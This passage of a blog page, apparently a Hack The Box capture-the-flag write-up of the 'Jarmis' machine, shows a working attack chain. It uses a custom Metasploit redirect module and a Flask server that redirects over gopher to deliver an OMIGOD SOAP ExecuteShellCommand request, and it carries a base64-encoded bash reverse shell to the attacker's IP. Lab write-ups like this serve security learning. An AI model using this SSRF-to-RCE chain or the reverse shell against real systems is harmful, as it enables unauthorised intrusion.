+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">OptString</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#39;RedirectURL&#39;</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;The page to redirect users to&#34;</span> <span style="color:#f92672">]</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">OptBool</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#39;SSL&#39;</span>, <span style="color:#f92672">[</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;Negotiate SSL for incoming connections&#34;</span>, <span style="color:#66d9ef">true</span><span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Not compatible today</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">support_ipv6?</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>
+</span></span><span style="display:flex;"><span>    @myhost   <span style="color:#f92672">=</span> datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;SRVHOST&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    @myport   <span style="color:#f92672">=</span> datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;SRVPORT&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    exploit
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">on_request_uri</span>(cli, req)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;RedirectURL&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>      print_status(<span style="color:#e6db74">&#34;Redirecting client </span><span style="color:#e6db74">#{</span>cli<span style="color:#f92672">.</span>peerhost<span style="color:#e6db74">}</span><span style="color:#e6db74"> to </span><span style="color:#e6db74">#{</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;RedirectURL&#39;</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>      send_redirect(cli, datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;RedirectURL&#39;</span><span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>      send_not_found(cli)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>We can then use this module by using the following commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; search jarmis
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                          Disclosure Date  Rank    Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                          ---------------  ----    -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  auxiliary/server/jarmisRedirect  .         normal  No     Redirect Jarmis Scanner to something <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>msf6 &gt; use <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>server/jarmisRedirect<span style="color:#f92672">)</span> &gt; set ssl true
+</span></span><span style="display:flex;"><span>ssl <span style="color:#f92672">=</span>&gt; true
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>server/jarmisRedirect<span style="color:#f92672">)</span> &gt; set srvport <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>srvport <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>server/jarmisRedirect<span style="color:#f92672">)</span> &gt; set srvhost tun0
+</span></span><span style="display:flex;"><span>srvhost <span style="color:#f92672">=</span>&gt; 10.10.14.146
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>server/jarmisRedirect<span style="color:#f92672">)</span> &gt; set redirecturl http://10.10.14.146/test
+</span></span><span style="display:flex;"><span>redirecturl <span style="color:#f92672">=</span>&gt; http://10.10.14.146/test
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>server/jarmisRedirect<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Auxiliary module running as background job 0.
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>server/jarmisRedirect<span style="color:#f92672">)</span> &gt; 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using URL: https://10.10.14.146/FrLyx9g
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Server started.
+</span></span></code></pre></div><p>And when running it, we get a new url that we can use, in our case it is: <code>https://10.10.14.146/FrLyx9g</code></p>
+<p>==&gt; Now to complete the redirection, we need to run this custom module alongside a python web server and pass this crafted url to <code>jarmis</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X <span style="color:#e6db74">&#39;GET&#39;</span> <span style="color:#e6db74">&#39;http://jarmis.htb/api/v1/fetch?endpoint=https://10.10.14.146/FrLyx9g&#39;</span> -H <span style="color:#e6db74">&#39;accept: application/json&#39;</span> | jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;sig&#34;</span>: <span style="color:#e6db74">&#34;07d19d12d21d21d07c42d43d000000f50d155305214cf247147c43c0f1a823&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;ismalicious&#34;</span>: false,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;10.10.14.146:443&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;Metasploit?&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>server/jarmisRedirect<span style="color:#f92672">)</span> &gt; 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Redirecting client 10.129.95.238 to http://10.10.14.146/test
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Redirecting client 10.129.95.238 to http://10.10.14.146/test
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>10.129.95.238 - - <span style="color:#f92672">[</span>20/Dec/2024 09:50:52<span style="color:#f92672">]</span> code 404, message File not found
+</span></span><span style="display:flex;"><span>10.129.95.238 - - <span style="color:#f92672">[</span>20/Dec/2024 09:50:52<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /test HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+</span></span></code></pre></div><p>Here we see that the redirection was successful!! We now have the means to try and use the <code>OMIGOD</code>vulnerability</p>
+<p>==&gt; The last hard part is now to create a custom server that will redirect the <code>jarmis</code>request as a <code>POST</code> &ndash;&gt; we can use <code>Flask</code>to do so.</p>
+<p>We will then want to have <code>Metasploit</code> redirect to our python server, we can then create it and set a new <code>redirecturl</code>field:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>server/jarmisRedirect<span style="color:#f92672">)</span> &gt; set redirecturl https://10.10.14.146:8443
+</span></span><span style="display:flex;"><span>redirecturl <span style="color:#f92672">=</span>&gt; https://10.10.14.146:8443
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, redirect
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">root</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;http://10.10.14.146&#39;</span>, code<span style="color:#f92672">=</span><span style="color:#ae81ff">301</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(ssl_context<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;adhoc&#39;</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8443</span>)
+</span></span></code></pre></div><p>So then when the request arrives, it follows this path:</p>
+<p><code>Metasploit</code>-&gt; Python server -&gt; <code>netcat</code> listening on port 80</p>
+<p><img src="Jarmis_redirect.png" alt=""></p>
+<p>The final step is to find a way to make the request go back to the server on port 5985</p>
+<h3 id="gopher">Gopher</h3>
+<p>We can use <code>gopher</code>for this and the first step is to replace the url in our server file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;gopher://10.10.14.146:5985/_test&#39;</span>, code<span style="color:#f92672">=</span><span style="color:#ae81ff">301</span>)
+</span></span><span style="display:flex;"><span>nc <span style="color:#f92672">-</span>lnvp <span style="color:#ae81ff">5985</span>
+</span></span></code></pre></div><p>And we see that the redirection is indeed working =&gt; the last step is to get a reverse shell from this.</p>
+<h3 id="adding-reverse-shell">Adding reverse shell</h3>
+<p>Now in order to get access on the server, we need to add the reverse shell by taking the  <code>DATA</code>and <code>REQUEST</code>fields from the <code>POC</code> and add a reverse shell command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.146/4444 0&gt;&amp;1&#39;</span> | base64
+</span></span><span style="display:flex;"><span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDYvNDQ0NCAwPiYxCg<span style="color:#f92672">==</span>
+</span></span></code></pre></div><p>and then we can modify our server to redirect this command to the remote server and listen on port 4444 to get a reverse shell, here is the last script for <code>server.py</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, redirect
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DATA <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;&lt;s:Envelope xmlns:s=&#34;http://www.w3.org/2003/05/soap-envelope&#34; xmlns:a=&#34;http://schemas.xmlsoap.org/ws/2004/08/addressing&#34; xmlns:h=&#34;http://schemas.microsoft.com/wbem/wsman/1/windows/shell&#34; xmlns:n=&#34;http://schemas.xmlsoap.org/ws/2004/09/enumeration&#34; xmlns:p=&#34;http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd&#34; xmlns:w=&#34;http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   &lt;s:Header&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;a:To&gt;HTTP://192.168.1.1:5986/wsman/&lt;/a:To&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;w:ResourceURI s:mustUnderstand=&#34;true&#34;&gt;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem&lt;/w:ResourceURI&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;a:ReplyTo&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">         &lt;a:Address s:mustUnderstand=&#34;true&#34;&gt;http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous&lt;/a:Address&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/a:ReplyTo&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;a:Action&gt;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand&lt;/a:Action&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;w:MaxEnvelopeSize s:mustUnderstand=&#34;true&#34;&gt;102400&lt;/w:MaxEnvelopeSize&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;a:MessageID&gt;uuid:0AB58087-C2C3-0005-0000-000000010000&lt;/a:MessageID&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;w:OperationTimeout&gt;PT1M30S&lt;/w:OperationTimeout&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;w:Locale xml:lang=&#34;en-us&#34; s:mustUnderstand=&#34;false&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;p:DataLocale xml:lang=&#34;en-us&#34; s:mustUnderstand=&#34;false&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;w:OptionSet s:mustUnderstand=&#34;true&#34; /&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;w:SelectorSet&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">         &lt;w:Selector Name=&#34;__cimnamespace&#34;&gt;root/scx&lt;/w:Selector&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/w:SelectorSet&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   &lt;/s:Header&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   &lt;s:Body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;p:ExecuteShellCommand_INPUT xmlns:p=&#34;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">         &lt;p:command&gt;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&lt;/p:command&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">         &lt;p:timeout&gt;0&lt;/p:timeout&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/p:ExecuteShellCommand_INPUT&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   &lt;/s:Body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/s:Envelope&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>REQUEST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;POST / HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: localhost:5985</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">User-Agent: curl/7.74.0</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: </span><span style="color:#e6db74">{length}</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: application/soap+xml;charset=UTF-8</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">{body}</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">root</span>():
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;echo &#39;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDYvNDQ0NCAwPiYxCg==&#39; | base64 -d | bash&#34;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> DATA<span style="color:#f92672">.</span>format(cmd)
+</span></span><span style="display:flex;"><span>    req <span style="color:#f92672">=</span> REQUEST<span style="color:#f92672">.</span>format(length<span style="color:#f92672">=</span>len(data)<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>, body<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>    enc_req <span style="color:#f92672">=</span> quote(req, safe<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;gopher://127.0.0.1:5985/_</span><span style="color:#e6db74">{</span>enc_req<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, code<span style="color:#f92672">=</span><span style="color:#ae81ff">301</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(ssl_context<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;adhoc&#39;</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8443</span>)
+</span></span></code></pre></div><p>and upon running all of this together, we get:</p>
+<p><img src="Jarmis_shell.png" alt=""></p>
+<p>And from here we can get the root and user flags!</p>
+
+		</div>
+		<footer class="post__footer">
+			
+<div class="post__tags tags clearfix">
+	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M4 0h8s2 0 4 2l15 15s2 2 0 4L21 31s-2 2-4 0L2 16s-2-2-2-4V3s0-3 4-3m3 10a3 3 0 0 0 0-6 3 3 0 0 0 0 6"/></svg>
+	<ul class="tags__list">
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/ctf/" rel="tag">CTF</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/htb/" rel="tag">HTB</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/machine/" rel="tag">Machine</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/box/" rel="tag">Box</a>
+		</li>
+	</ul>
+</div>
+		</footer>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Flavien Jaquerod avatar" src="/img/avatar.png" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Flavien Jaquerod</span>
+	</div>
+	<div class="authorbox__description">
+		Currently studying a cybersecurity Master&rsquo;s degree at EPFL and ETHZ. Also solving CTF challenges or HTB Machines in my free time!
+	</div>
+</div>
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/builder/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Builder</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/candy-vault/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">Candy Vault</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2025 Flavien Jaquerod.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+<script src="/js/custom.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+</body>
+</html>
